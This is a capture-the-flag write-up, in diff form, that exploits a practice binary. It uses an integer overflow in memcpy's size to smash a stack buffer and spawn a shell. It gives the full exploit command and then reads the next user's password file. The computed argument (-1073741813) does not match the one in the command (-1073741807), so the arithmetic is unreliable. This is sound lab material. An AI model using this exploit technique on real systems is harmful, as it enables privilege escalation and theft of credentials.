@@ -1,0 +1,58 @@
+The binary takes 2 arguments.
+A call to atoi() is made to get first argument as a number.
+A memcpy is made if the returned value is inferior or equal to 9.
+
+If the value is equal to 0x574f4c46 (1464814662 in decimal), a shell is launched.
+
+(gdb) disas main
+0x08048438 <+20>:    call   0x8048360 <atoi@plt>
+...
+0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
+0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
+0x08048480 <+92>:    jne    0x804849e <main+122>
+0x08048482 <+94>:    movl   $0x0,0x8(%esp)
+0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
+0x08048492 <+110>:   movl   $0x8048583,(%esp)
+0x08048499 <+117>:   call   0x8048350 <execl@plt>
+0x0804849e <+122>:   mov    $0x0,%eax
+0x080484a3 <+127>:   leave
+0x080484a4 <+128>:   ret
+
+The size to be copied in memcpy() is the first argument multiplied by 4.
+The size of the first argument in memcpy(), the buffer is 40.
+
+gdb --args bonus1 1 blabla
+(gdb) b * 0x08048473
+(gdb) i r
+ecx            0x4      4
+
+gdb --args bonus1 8 blabla
+(gdb) b * 0x08048473
+(gdb) i r
+ecx            0x20     32
+
+The goal is then to use memcpy() to overflow and change the address on the stack.
+The size of the buffer to overflow is 40 so we need to find a way to put 0x574f4c46 (1464814662) at 40 + 4.
+Since we can't use a number greater than 9, we need to use an integer overflow as well in order to create a large enough buffer.
+memcpy() uses size_t as it's third argument type which is the same as unsigned int on a 32 bit system.
+The max value for an unsigned int is 4,294,967,295.
+We need to divide by 4 since the program multiplies by 4 in memcpy().
+4,294,967,295 = 1073741823.
+We are using a buffer of 40 so 1073741823 - 40 / 4 = 1073741813.
+
+Using integer overflow, -1073741813 * 4 = 44.
+
+Our first argument will then be -1073741813
+
+We can now bypass the first condition and use a size of 44 to overflow.
+The second argument being copied into the buffer, we will use it to deliver the payload.
+
+In summary we have :
+
+memcpy(buffer, argv[2], i * 4); -> 40, 40 + 4, 44
+
+./bonus1 -1073741807 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
